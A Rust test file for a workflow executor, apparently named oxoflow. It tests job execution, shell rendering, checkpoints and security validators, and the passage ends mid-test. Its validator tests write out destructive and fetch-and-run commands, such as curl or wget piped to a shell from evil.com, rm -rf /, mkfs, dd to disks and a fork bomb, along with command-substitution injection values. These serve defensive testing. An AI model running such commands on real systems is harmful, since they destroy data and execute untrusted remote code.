use super::checkpoint::*;
use super::process::*;
use super::security::*;
use crate::rule::{EnvironmentSpec, FilePatterns, Resources, Rule, RuleBuilder};
use std::collections::HashMap;

fn make_rule(name: &str, shell: &str) -> Rule {
    Rule {
        name: name.to_string(),
        input: vec![].into(),
        output: vec![].into(),
        shell: Some(shell.to_string()),
        script: None,
        resources: Resources::default(),
        environment: EnvironmentSpec::default(),
        log: None,
        benchmark: None,
        params: HashMap::new(),
        priority: 0,
        target: false,
        group: None,
        description: None,
        ..Default::default()
    }
}

#[test]
fn job_status_display() {
    assert_eq!(JobStatus::Pending.to_string(), "pending");
    assert_eq!(JobStatus::Running.to_string(), "running");
    assert_eq!(JobStatus::Success.to_string(), "success");
    assert_eq!(JobStatus::Failed.to_string(), "failed");
    assert_eq!(JobStatus::Skipped.to_string(), "skipped");
}

#[test]
fn dry_run_rules() {
    let config = ExecutorConfig {
        dry_run: true,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rules = vec![
        make_rule("step1", "echo hello"),
        make_rule("step2", "echo world"),
    ];

    let records = executor.dry_run_rules(&rules);
    assert_eq!(records.len(), 2);
    assert_eq!(records[0].status, JobStatus::Skipped);
    assert_eq!(records[1].status, JobStatus::Skipped);
}

#[tokio::test]
async fn execute_echo() {
    let config = ExecutorConfig {
        max_jobs: 2,
        dry_run: false,
        workdir: std::env::temp_dir(),
        keep_going: false,
        retry_count: 0,
        timeout: None,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = make_rule("echo_test", "echo hello_oxoflow");

    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
    assert!(record.stdout.unwrap().contains("hello_oxoflow"));
}

#[tokio::test]
async fn execute_creates_config_var_output_dirs() {
    let workdir = std::env::temp_dir().join(format!("oxo-outdir-test-{}", std::process::id()));
    let _ = tokio::fs::remove_dir_all(&workdir).await;
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: workdir.clone(),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let mut rule = make_rule("outdir_test", "echo hi > {output}");
    rule.output = FilePatterns::List(vec!["{config.results_dir}/nested/hello.txt".to_string()]);
    let mut values = HashMap::new();
    values.insert("config.results_dir".to_string(), "out".to_string());

    let record = executor.execute_rule(&rule, &values).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
    // The literal {config.results_dir} directory must NOT be created;
    // the expanded path must.
    assert!(workdir.join("out/nested/hello.txt").exists());
    assert!(!workdir.join("{config.results_dir}").exists());

    let _ = tokio::fs::remove_dir_all(&workdir).await;
}

#[tokio::test]
async fn execute_dry_run() {
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: true,
        workdir: std::env::temp_dir(),
        keep_going: false,
        retry_count: 0,
        timeout: None,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = make_rule("dry_test", "echo should_not_run");

    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Skipped);
}

/// Sampled CPU metering reaches JobRecord (issue #83 P1-13): a busy shell
/// loop must accumulate positive CPU seconds (bounded by wall time), and
/// a rule skipped by its `when` condition stays `None` — it never spawns.
#[tokio::test]
async fn execute_records_sampled_cpu_seconds() {
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: std::env::temp_dir(),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    // Busy loop, ~1-2 s of CPU on both bash (macOS) and dash (Linux CI):
    // long enough to span several sampler ticks so the sampled value is
    // reliably non-zero.
    let busy = make_rule("busy", "i=0; while [ $i -lt 800000 ]; do i=$((i+1)); done");
    let record = executor.execute_rule(&busy, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
    let cpu = record
        .cpu_seconds
        .expect("busy rule must accumulate sampled CPU seconds");
    assert!(cpu > 0.0, "sampled CPU must be positive, got {cpu}s");
    let wall_secs = record
        .finished_at
        .and_then(|f| record.started_at.map(|s| f.signed_duration_since(s)))
        .expect("executed rule must have timestamps")
        .num_milliseconds() as f64
        / 1000.0;
    // Threads sanity: even multi-core overshoot cannot exceed 32× wall time.
    assert!(cpu <= wall_secs * 32.0, "CPU {cpu}s vs wall {wall_secs}s");

    let mut skipped = make_rule("skipped", "echo never");
    skipped.when = Some("false".to_string());
    let record = executor
        .execute_rule(&skipped, &HashMap::new())
        .await
        .unwrap();
    assert_eq!(record.status, JobStatus::Skipped);
    assert_eq!(record.cpu_seconds, None);
}

#[tokio::test]
async fn execute_failing_command() {
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: std::env::temp_dir(),
        keep_going: true,
        retry_count: 0,
        timeout: None,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = make_rule("fail_test", "exit 42");

    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Failed);
    assert_eq!(record.exit_code, Some(42));
}

#[tokio::test]
async fn execute_shell_exits_zero_but_outputs_missing() {
    let tmp = std::env::temp_dir().join("oxo_test_output_validation");
    let _ = std::fs::create_dir_all(&tmp);
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: tmp.clone(),
        keep_going: false,
        retry_count: 0,
        timeout: None,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    // Rule declares an output but shell just runs "true" (exits 0, creates nothing).
    let rule = RuleBuilder::new("missing_output_test")
        .shell("true")
        .output(vec!["should_exist.txt".to_string()])
        .build();

    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(
        record.status,
        JobStatus::Failed,
        "rule should fail when declared outputs are missing, even if shell exits 0"
    );
    assert_eq!(record.exit_code, Some(-1));
    assert!(
        record
            .stderr
            .as_ref()
            .is_some_and(|s| s.contains("output validation failed"))
    );
    // Cleanup
    let _ = std::fs::remove_dir_all(&tmp);
}

#[tokio::test]
async fn execute_shell_creates_outputs_succeeds() {
    let tmp = std::env::temp_dir().join("oxo_test_output_validation_ok");
    let _ = std::fs::create_dir_all(&tmp);
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: tmp.clone(),
        keep_going: false,
        retry_count: 0,
        timeout: None,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = RuleBuilder::new("output_ok_test")
        .shell("echo done > output.txt")
        .output(vec!["output.txt".to_string()])
        .build();

    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(
        record.status,
        JobStatus::Success,
        "rule should succeed when shell exits 0 and outputs exist"
    );
    // Cleanup
    let _ = std::fs::remove_dir_all(&tmp);
}

#[tokio::test]
async fn execute_wildcard_expansion() {
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: std::env::temp_dir(),
        keep_going: false,
        retry_count: 0,
        timeout: None,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = make_rule("wildcard_test", "echo {sample}");

    let mut values = HashMap::new();
    values.insert("sample".to_string(), "TUMOR_01".to_string());

    let record = executor.execute_rule(&rule, &values).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
    assert!(record.stdout.unwrap().contains("TUMOR_01"));
}

#[test]
fn render_shell_command_named_io() {
    let mut named_input = HashMap::new();
    named_input.insert("reads".to_string(), "data.fq".to_string());
    let mut named_output = HashMap::new();
    named_output.insert("bam".to_string(), "sorted.bam".to_string());

    let rule = RuleBuilder::new("align")
        .input(named_input)
        .output(named_output)
        .build();

    let result = render_shell_command(
        "bwa mem {input.reads} > {output.bam}",
        &rule,
        &HashMap::new(),
    );
    assert_eq!(result, "bwa mem data.fq > sorted.bam");
}

#[test]
fn render_shell_output_indexed() {
    let rule = Rule {
        name: "test".to_string(),
        input: vec!["in.txt".to_string()].into(),
        output: vec!["out.txt".to_string(), "out2.txt".to_string()].into(),
        shell: None,
        ..Default::default()
    };
    let result = render_shell_command("cat {input[0]} > {output[0]}", &rule, &HashMap::new());
    assert_eq!(result, "cat in.txt > out.txt");
}

#[test]
fn render_shell_output_all() {
    let rule = Rule {
        name: "test".to_string(),
        input: vec!["a.txt".to_string(), "b.txt".to_string()].into(),
        output: vec!["out.txt".to_string()].into(),
        shell: None,
        ..Default::default()
    };
    let result = render_shell_command("cat {input} > {output}", &rule, &HashMap::new());
    assert_eq!(result, "cat a.txt b.txt > out.txt");
}

#[test]
fn render_shell_threads() {
    let rule = Rule {
        name: "test".to_string(),
        resources: Resources {
            threads: 8,
            ..Default::default()
        },
        output: vec!["out.bam".to_string()].into(),
        ..Default::default()
    };
    let result = render_shell_command(
        "bwa mem -t {threads} ref.fa > {output[0]}",
        &rule,
        &HashMap::new(),
    );
    assert_eq!(result, "bwa mem -t 8 ref.fa > out.bam");
}

#[test]
fn render_shell_config_values() {
    let rule = Rule {
        name: "test".to_string(),
        output: vec!["hello.txt".to_string()].into(),
        ..Default::default()
    };
    let mut values = HashMap::new();
    values.insert("config.reference".to_string(), "/data/ref.fa".to_string());
    let result = render_shell_command("bwa mem {config.reference} > {output[0]}", &rule, &values);
    assert_eq!(result, "bwa mem /data/ref.fa > hello.txt");
}

#[tokio::test]
async fn execute_output_index_expansion() {
    let tmp = std::env::temp_dir().join("oxo_test_output_index");
    let _ = std::fs::create_dir_all(&tmp);
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: tmp.clone(),
        keep_going: false,
        retry_count: 0,
        timeout: None,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = Rule {
        name: "output_test".to_string(),
        input: vec![].into(),
        output: vec!["hello_output.txt".to_string()].into(),
        shell: Some("touch {output[0]} && echo hello_oxoflow_{output[0]}".to_string()),
        ..Default::default()
    };
    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
    let stdout = record.stdout.unwrap();
    assert!(
        stdout.contains("hello_oxoflow_hello_output.txt"),
        "stdout was: {stdout}"
    );
    let _ = std::fs::remove_dir_all(&tmp);
}

#[test]
fn benchmark_record_creation() {
    let b = BenchmarkRecord {
        rule: "fastqc".to_string(),
        wall_time_secs: 42.5,
        max_memory_mb: Some(1024),
        memory_limit_mb: None,
        retries: 0,
        cpu_seconds: Some(38.0),
    };
    assert_eq!(b.rule, "fastqc");
    assert!((b.wall_time_secs - 42.5).abs() < f64::EPSILON);
    assert_eq!(b.max_memory_mb, Some(1024));
    assert_eq!(b.cpu_seconds, Some(38.0));
}

#[test]
fn checkpoint_mark_completed() {
    let mut state = CheckpointState::new();
    let bench = BenchmarkRecord {
        rule: "step1".to_string(),
        wall_time_secs: 5.0,
        max_memory_mb: None,
        memory_limit_mb: None,
        retries: 0,
        cpu_seconds: None,
    };
    state.mark_completed("step1", bench);
    assert!(state.is_completed("step1"));
    assert!(state.should_skip("step1"));
    assert!(!state.failed_rules.contains("step1"));
}

#[test]
fn checkpoint_mark_failed() {
    let mut state = CheckpointState::new();
    state.mark_failed("step2");
    assert!(!state.is_completed("step2"));
    assert!(!state.should_skip("step2"));
    assert!(state.failed_rules.contains("step2"));
}

#[test]
fn checkpoint_json_round_trip() {
    let mut state = CheckpointState::new();
    state.mark_completed(
        "align",
        BenchmarkRecord {
            rule: "align".to_string(),
            wall_time_secs: 120.0,
            max_memory_mb: Some(8192),
            memory_limit_mb: None,
            retries: 0,
            cpu_seconds: Some(110.0),
        },
    );
    state.mark_failed("variant_call");

    let json = state.to_json().unwrap();
    let restored = CheckpointState::from_json(&json).unwrap();

    assert!(restored.is_completed("align"));
    assert!(restored.failed_rules.contains("variant_call"));
}

#[test]
fn checkpoint_record_run_persists_diagnostics() {
    let mut state = CheckpointState::new();
    let record = JobRecord {
        rule: "call".to_string(),
        status: JobStatus::Failed,
        started_at: None,
        finished_at: None,
        exit_code: Some(127),
        stdout: None,
        stderr: Some("gatk: command not found".to_string()),
        command: Some("gatk HaplotypeCaller -I out.bam".to_string()),
        retries: 0,
        timeout: None,
        skip_reason: None,
        max_rss_mb: None,
        cpu_seconds: None,
    };
    state.record_run(&record);
    state.mark_failed("call");

    // Round-trips through JSON so legacy/forward compatibility is covered.
    let json = state.to_json().unwrap();
    let restored = CheckpointState::from_json(&json).unwrap();
    let run = restored.rule_runs.get("call").unwrap();
    assert_eq!(run.exit_code, Some(127));
    assert_eq!(
        run.command.as_deref(),
        Some("gatk HaplotypeCaller -I out.bam")
    );
    assert_eq!(run.stderr_tail.as_deref(), Some("gatk: command not found"));
}

#[test]
fn checkpoint_stderr_tail_is_bounded() {
    let mut state = CheckpointState::new();
    let long = "x".repeat(10_000);
    let record = JobRecord {
        rule: "noisy".to_string(),
        status: JobStatus::Failed,
        started_at: None,
        finished_at: None,
        exit_code: Some(1),
        stdout: None,
        stderr: Some(long),
        command: None,
        retries: 0,
        timeout: None,
        skip_reason: None,
        max_rss_mb: None,
        cpu_seconds: None,
    };
    state.record_run(&record);
    let tail = state.rule_runs["noisy"].stderr_tail.as_deref().unwrap();
    assert!(tail.starts_with('…'));
    // 2048 chars of content + the "…\n" truncation marker.
    assert!(tail.chars().count() <= 2048 + 2, "tail must stay bounded");
}

#[test]
fn file_is_newer_with_real_files() {
    let dir = tempfile::tempdir().unwrap();
    let older = dir.path().join("older.txt");
    let newer = dir.path().join("newer.txt");

    std::fs::write(&older, "old").unwrap();
    std::thread::sleep(std::time::Duration::from_millis(50));
    std::fs::write(&newer, "new").unwrap();

    assert!(file_is_newer(&newer, &older));
    assert!(!file_is_newer(&older, &newer));
}

#[tokio::test]
async fn execute_with_timeout() {
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: std::env::temp_dir(),
        keep_going: true,
        retry_count: 0,
        timeout: Some(std::time::Duration::from_millis(100)),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = make_rule("timeout_test", "sleep 30");

    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::TimedOut);
    assert!(record.stderr.unwrap().contains("timed out"));
}

#[test]
fn evaluate_condition_complex_expression() {
    let mut config = HashMap::new();
    config.insert("run_qc".to_string(), toml::Value::Boolean(true));
    config.insert("threads".to_string(), toml::Value::Integer(8));
    config.insert(
        "mode".to_string(),
        toml::Value::String("tumor_normal".to_string()),
    );

    assert!(evaluate_condition(
        r#"config.run_qc == true && config.threads >= 4 && config.mode == "tumor_normal""#,
        &config
    ));
}

#[test]
fn evaluate_condition_with_config_prefix() {
    let mut config = HashMap::new();
    config.insert("mode".to_string(), toml::Value::String("dna".to_string()));
    config.insert(
        "min_qual".to_string(),
        toml::Value::String("30".to_string()),
    );

    // Bare key reference (truthiness)
    assert!(
        evaluate_condition("config.mode", &config),
        "truthy config.mode"
    );
    assert!(
        !evaluate_condition("config.missing", &config),
        "falsy config.missing"
    );

    // Equality comparison
    assert!(evaluate_condition(r#"config.mode == "dna""#, &config));
    assert!(!evaluate_condition(r#"config.mode == "rna""#, &config));

    // Equality with string value
    assert!(evaluate_condition(r#"config.min_qual == "30""#, &config));
    assert!(!evaluate_condition(r#"config.min_qual == "20""#, &config));

    // Mixed conditions
    config.insert("paired".to_string(), toml::Value::Boolean(true));
    assert!(evaluate_condition(
        r#"config.paired == true && config.mode == "dna""#,
        &config
    ));
}

#[test]
fn evaluate_condition_typed_integer_comparison() {
    let mut config = HashMap::new();
    config.insert("min_qual".to_string(), toml::Value::Integer(30));
    config.insert("threads".to_string(), toml::Value::Integer(8));

    assert!(evaluate_condition("config.min_qual == 30", &config));
    assert!(!evaluate_condition("config.min_qual == 20", &config));
    assert!(evaluate_condition("config.min_qual >= 20", &config));
    assert!(evaluate_condition("config.min_qual <= 30", &config));
    assert!(evaluate_condition("config.min_qual > 10", &config));
    assert!(evaluate_condition("config.min_qual < 50", &config));
    assert!(!evaluate_condition("config.min_qual >= 50", &config));
    assert!(evaluate_condition(
        "config.min_qual >= 20 && config.threads >= 4",
        &config
    ));
}

#[test]
fn evaluate_condition_typed_float_comparison() {
    let mut config = HashMap::new();
    config.insert("threshold".to_string(), toml::Value::Float(1e-5));

    assert!(evaluate_condition("config.threshold == 0.00001", &config));
    assert!(!evaluate_condition("config.threshold == 0.001", &config));
    assert!(evaluate_condition("config.threshold < 0.001", &config));
    assert!(evaluate_condition("config.threshold > 1e-10", &config));
}

#[test]
fn validate_shell_safety_blocks_dangerous_deletion() {
    assert!(validate_shell_safety("rm -rf /").is_err());
}

#[test]
fn validate_wildcard_injection_blocks_command_substitution() {
    let mut values = HashMap::new();
    values.insert("sample".to_string(), "$(whoami)".to_string());
    assert!(validate_wildcard_injection(&values).is_err());
}

// ---------------------------------------------------------------------------
// validate_shell_safety — bypass attempt tests
// ---------------------------------------------------------------------------

#[test]
fn validate_shell_safety_blocks_rm_rf_with_no_preserve_root() {
    assert!(
        validate_shell_safety("rm -rf --no-preserve-root /").is_err(),
        "should block rm -rf --no-preserve-root /"
    );
}

#[test]
fn validate_shell_safety_blocks_rm_rf_extra_spaces() {
    assert!(
        validate_shell_safety("rm  -rf  /").is_err(),
        "should block rm  -rf  / (extra spaces)"
    );
}

#[test]
fn validate_shell_safety_blocks_rm_rf_home_data() {
    assert!(
        validate_shell_safety("rm -rf ~/data").is_err(),
        "should block rm -rf ~/data"
    );
}

#[test]
fn validate_shell_safety_blocks_rm_rf_tilde() {
    assert!(
        validate_shell_safety("rm -rf ~").is_err(),
        "should block rm -rf ~"
    );
}

#[test]
fn validate_shell_safety_blocks_rm_r_root() {
    assert!(
        validate_shell_safety("rm -r /").is_err(),
        "should block rm -r /"
    );
}

#[test]
fn validate_shell_safety_blocks_mkfs_ext4() {
    assert!(
        validate_shell_safety("mkfs.ext4 /dev/sda").is_err(),
        "should block mkfs.ext4 /dev/sda"
    );
}

#[test]
fn validate_shell_safety_blocks_mkfs_btrfs() {
    assert!(
        validate_shell_safety("mkfs.btrfs /dev/sdb1").is_err(),
        "should block mkfs.btrfs"
    );
}

#[test]
fn validate_shell_safety_blocks_mkswap() {
    assert!(
        validate_shell_safety("mkswap /dev/sda1").is_err(),
        "should block mkswap"
    );
}

#[test]
fn validate_shell_safety_blocks_dd_to_block_device() {
    assert!(
        validate_shell_safety("dd if=/dev/zero of=/dev/sda bs=1M").is_err(),
        "should block dd to block device"
    );
}

#[test]
fn validate_shell_safety_blocks_chmod_r_777() {
    assert!(
        validate_shell_safety("chmod -R 777 /").is_err(),
        "should block chmod -R 777 /"
    );
}

#[test]
fn validate_shell_safety_blocks_chmod_777_etc() {
    assert!(
        validate_shell_safety("chmod 777 /etc/passwd").is_err(),
        "should block chmod 777 /etc/passwd"
    );
}

#[test]
fn validate_shell_safety_blocks_wget_pipe_sh() {
    assert!(
        validate_shell_safety("wget -O- http://evil.com/script.sh | sh").is_err(),
        "should block wget pipe to sh"
    );
}

#[test]
fn validate_shell_safety_blocks_curl_pipe_bash() {
    assert!(
        validate_shell_safety("curl -s http://evil.com | bash").is_err(),
        "should block curl pipe to bash"
    );
}

#[test]
fn validate_shell_safety_blocks_curl_pipe_sudo() {
    assert!(
        validate_shell_safety("curl http://evil.com | sudo bash").is_err(),
        "should block curl pipe to sudo"
    );
}

#[test]
fn validate_shell_safety_blocks_block_device_write_redirect() {
    assert!(
        validate_shell_safety("echo test > /dev/sda").is_err(),
        "should block direct write to /dev/sda"
    );
}

#[test]
fn validate_shell_safety_blocks_block_device_append_redirect() {
    assert!(
        validate_shell_safety("echo test >> /dev/sdb1").is_err(),
        "should block append to /dev/sdb1"
    );
}

#[test]
fn validate_shell_safety_blocks_fork_bomb() {
    assert!(
        validate_shell_safety(":(){ :|:& };:").is_err(),
        "should block fork bomb"
    );
}

#[test]
fn validate_shell_safety_blocks_dd_from_dev_random() {
    assert!(
        validate_shell_safety("dd if=/dev/random of=output.dat bs=1024").is_err(),
        "should block dd from /dev/random"
    );
}

#[test]
fn validate_shell_safety_blocks_dd_from_dev_urandom() {
    assert!(
        validate_shell_safety("dd if=/dev/urandom of=output.bin bs=4096").is_err(),
        "should block dd from /dev/urandom"
    );
}

#[test]
fn validate_shell_safety_blocks_mkfs_plain() {
    assert!(
        validate_shell_safety("mkfs /dev/sda").is_err(),
        "should block plain mkfs"
    );
}

#[test]
fn validate_shell_safety_blocks_wget_pipe_dash() {
    assert!(
        validate_shell_safety("wget -qO- http://evil.net/payload | dash").is_err(),
        "should block wget pipe to dash"
    );
}

#[test]
fn validate_shell_safety_allows_rm_rf_relative_path() {
    assert!(
        validate_shell_safety("rm -rf output_dir/").is_ok(),
        "should allow rm -rf with relative path"
    );
}

#[test]
fn validate_shell_safety_allows_dd_normal_usage() {
    assert!(
        validate_shell_safety("dd if=input.fastq of=output.fastq bs=1M").is_ok(),
        "should allow normal dd usage"
    );
}

#[test]
fn validate_shell_safety_allows_bwa_mem() {
    assert!(
        validate_shell_safety("bwa mem ref.fa reads.fq > out.sam").is_ok(),
        "should allow bwa mem with redirect"
    );
}

#[test]
fn validate_shell_safety_allows_samtools_sort() {
    assert!(
        validate_shell_safety("samtools sort in.bam -o out.bam").is_ok(),
        "should allow samtools sort"
    );
}

#[test]
fn validate_shell_safety_allows_echo_hello() {
    assert!(
        validate_shell_safety("echo hello").is_ok(),
        "should allow echo hello"
    );
}

#[test]
fn validate_shell_safety_allows_fastp() {
    assert!(
        validate_shell_safety("fastp -i in.fq -o out.fq").is_ok(),
        "should allow fastp with pipes and flags"
    );
}

#[test]
fn validate_shell_safety_allows_pipe_chaining() {
    assert!(
        validate_shell_safety("cat reads.fq | fastp -o out.fq").is_ok(),
        "should allow pipe chaining (common bioinformatics idiom)"
    );
}

#[test]
fn validate_shell_safety_allows_semicolons() {
    assert!(
        validate_shell_safety("echo start; bwa mem ref.fa reads.fq > out.sam; echo done").is_ok(),
        "should allow semicolons (common bioinformatics idiom)"
    );
}

#[test]
fn validate_shell_safety_allows_double_ampersand() {
    assert!(
        validate_shell_safety("bwa index ref.fa && bwa mem ref.fa reads.fq > out.sam").is_ok(),
        "should allow && chaining"
    );
}

#[test]
fn validate_shell_safety_allows_rm_relative_without_root() {
    assert!(
        validate_shell_safety("rm -rf results/").is_ok(),
        "should allow rm -rf with non-root relative path"
    );
}

// ---------------------------------------------------------------------------
// sanitize_shell_command tests
// ---------------------------------------------------------------------------

#[test]
fn sanitize_shell_command_detects_command_substitution() {
    let warnings = sanitize_shell_command("echo $(whoami)");
    assert!(
        warnings
            .iter()
            .any(|w| w.contains("Command substitution detected")),
        "should warn on $()"
    );
}

#[test]
fn sanitize_shell_command_detects_backtick() {
    let warnings = sanitize_shell_command("echo `whoami`");
    assert!(
        warnings
            .iter()
            .any(|w| w.contains("Backtick command substitution detected")),
        "should warn on backticks"
    );
}

#[test]
fn sanitize_shell_command_detects_dev_redirect() {
    let warnings = sanitize_shell_command("echo test >/dev/null");
    assert!(
        warnings
            .iter()
            .any(|w| w.contains("Redirect to /dev/ detected")),
        "should warn on >/dev/ redirect"
    );
}

#[test]
fn sanitize_shell_command_detects_eval() {
    let warnings = sanitize_shell_command("eval echo hello");
    assert!(
        warnings.iter().any(|w| w.contains("eval usage detected")),
        "should warn on eval"
    );
}

#[test]
fn sanitize_shell_command_no_false_positives_simple_cmd() {
    let warnings = sanitize_shell_command("echo hello world");
    assert!(
        warnings.is_empty(),
        "should not warn on simple commands: {:?}",
        warnings
    );
}

#[test]
fn sanitize_shell_command_no_false_positives_bioinformatics() {
    let warnings = sanitize_shell_command("bwa mem ref.fa reads.fq > out.sam");
    assert!(
        warnings.is_empty(),
        "should not warn on bioinformatics commands: {:?}",
        warnings
    );
}

// ---------------------------------------------------------------------------
// validate_path_safety tests
// ---------------------------------------------------------------------------

#[test]
fn validate_path_safety_allows_relative_path() {
    let workdir = std::path::Path::new("/tmp/test-workflow");
    validate_path_safety(workdir, "results/output.txt").unwrap();
}

#[test]
fn validate_path_safety_allows_absolute_path_in_workdir() {
    let workdir = std::path::Path::new("/tmp/test-workflow");
    validate_path_safety(workdir, "/tmp/test-workflow/results/output.txt").unwrap();
}

#[test]
fn validate_path_safety_blocks_absolute_path_outside_workdir() {
    let workdir = std::path::Path::new("/tmp/test-workflow");
    let result = validate_path_safety(workdir, "/etc/passwd");
    assert!(
        result.is_err(),
        "should block absolute path outside workdir"
    );
}

#[test]
fn validate_path_safety_blocks_traversal() {
    let workdir = std::path::Path::new("/tmp/test-workflow");
    let result = validate_path_safety(workdir, "../escape/passwd");
    assert!(result.is_err(), "should block path traversal via '..'");
}

#[test]
fn validate_path_safety_allows_output_without_traversal() {
    let workdir = std::path::Path::new("/tmp/test-workflow");
    validate_path_safety(workdir, "results/{sample}_output.txt").unwrap();
}

// ---------------------------------------------------------------------------
// validate_interpreter_path tests
// ---------------------------------------------------------------------------

#[test]
fn validate_interpreter_path_allows_simple_name() {
    validate_interpreter_path("python3").unwrap();
}

#[test]
fn validate_interpreter_path_allows_safe_absolute_path() {
    validate_interpreter_path("/usr/bin/python3").unwrap();
}

#[test]
fn validate_interpreter_path_blocks_unsafe_absolute_path() {
    let result = validate_interpreter_path("/tmp/evil/python");
    assert!(
        result.is_err(),
        "should block absolute path not in safe directories"
    );
}

#[test]
fn validate_interpreter_path_blocks_traversal() {
    let result = validate_interpreter_path("../etc/shell");
    assert!(
        result.is_err(),
        "should block interpreter path with traversal"
    );
}

#[test]
fn validate_interpreter_path_allows_home_path() {
    validate_interpreter_path("/home/user/bin/python3").unwrap();
}

#[test]
fn validate_interpreter_path_allows_opt_path() {
    validate_interpreter_path("/opt/conda/bin/python3").unwrap();
}

// ---------------------------------------------------------------------------
// Additional wildcard injection tests
// ---------------------------------------------------------------------------

#[test]
fn validate_wildcard_injection_allows_config_keys() {
    let mut values = HashMap::<String, String>::new();
    values.insert("config.sample_name".to_string(), "$(whoami)".to_string());
    values.insert("sample".to_string(), "SAMPLE_01".to_string());
    // Config-prefixed keys should be skipped (trusted from .oxoflow file)
    validate_wildcard_injection(&values).unwrap();
}

#[test]
fn validate_wildcard_injection_blocks_pipe_in_value() {
    let mut values = HashMap::<String, String>::new();
    values.insert("sample".to_string(), "SAMPLE_01 | echo hacked".to_string());
    // Pipes are not currently blocked by wildcard injection (only $() and backticks)
    // This test verifies the current behavior
    // The pipe would be caught by validate_shell_safety on the rendered command
    validate_wildcard_injection(&values).unwrap();
}

#[test]
fn validate_wildcard_injection_blocks_backtick_in_value() {
    let mut values = HashMap::<String, String>::new();
    values.insert("sample".to_string(), "`evil`".to_string());
    let result = validate_wildcard_injection(&values);
    assert!(result.is_err(), "should block backtick in wildcard values");
}

#[test]
fn validate_wildcard_injection_blocks_subshell_in_value() {
    let mut values = HashMap::<String, String>::new();
    values.insert("sample".to_string(), "$(echo hacked)".to_string());
    let result = validate_wildcard_injection(&values);
    assert!(result.is_err(), "should block $() in wildcard values");
}

#[tokio::test]
async fn check_resources_fails_fast_when_group_exceeds_declared_capacity() {
    let config = ExecutorConfig {
        workdir: std::env::temp_dir(),
        resource_groups: HashMap::from([("gpu".to_string(), 1)]),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let mut rule = make_rule("gpu_job", "echo hi");
    rule.resources.groups = HashMap::from([("gpu".to_string(), 2)]);
    // Requirement (2) exceeds declared capacity (1): must fail immediately
    // instead of waiting forever in the resource-notify loop.
    let err = executor.check_resources(&rule).await.unwrap_err();
    match err {
        crate::OxoFlowError::ResourceGroupExhausted {
            group,
            required,
            available,
            ..
        } => {
            assert_eq!(group, "gpu");
            assert_eq!(required, 2);
            assert_eq!(available, 1);
        }
        other => panic!("expected ResourceGroupExhausted, got {other}"),
    }
}

#[tokio::test]
async fn check_resources_fails_fast_when_group_is_undeclared() {
    let config = ExecutorConfig {
        workdir: std::env::temp_dir(),
        resource_groups: HashMap::new(),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let mut rule = make_rule("gpu_job", "echo hi");
    rule.resources.groups = HashMap::from([("gpu".to_string(), 1)]);
    // The workflow declares no [resource_groups]: the request can never be
    // satisfied, so it must fail fast with an actionable error.
    let err = executor.check_resources(&rule).await.unwrap_err();
    match err {
        crate::OxoFlowError::ResourceGroupExhausted { available, .. } => {
            assert_eq!(available, 0);
        }
        other => panic!("expected ResourceGroupExhausted, got {other}"),
    }
}

#[tokio::test]
async fn force_rules_bypasses_freshness_skip() {
    let workdir = std::env::temp_dir().join(format!("oxo-force-test-{}", std::process::id()));
    let _ = tokio::fs::remove_dir_all(&workdir).await;
    tokio::fs::create_dir_all(&workdir).await.unwrap();

    // Output exists and is newer than the input → the mtime freshness gate
    // would normally skip the rule. force_rules must bypass it (issue #62:
    // checkpoint-invalidated rules must actually re-execute).
    tokio::fs::write(workdir.join("in.txt"), b"input")
        .await
        .unwrap();
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    tokio::fs::write(workdir.join("out.txt"), b"stale")
        .await
        .unwrap();

    let mut rule = make_rule("fresh_skip", "echo fresh > {output}");
    rule.input = FilePatterns::List(vec!["in.txt".to_string()]);
    rule.output = FilePatterns::List(vec!["out.txt".to_string()]);

    // Without force: freshness gate skips.
    let executor = LocalExecutor::new(ExecutorConfig {
        workdir: workdir.clone(),
        ..Default::default()
    });
    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Skipped);
    assert_eq!(record.skip_reason.as_deref(), Some("outputs up-to-date"));

    // With force_rules: the rule re-executes and rewrites the output.
    let executor = LocalExecutor::new(ExecutorConfig {
        workdir: workdir.clone(),
        force_rules: std::collections::HashSet::from(["fresh_skip".to_string()]),
        ..Default::default()
    });
    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
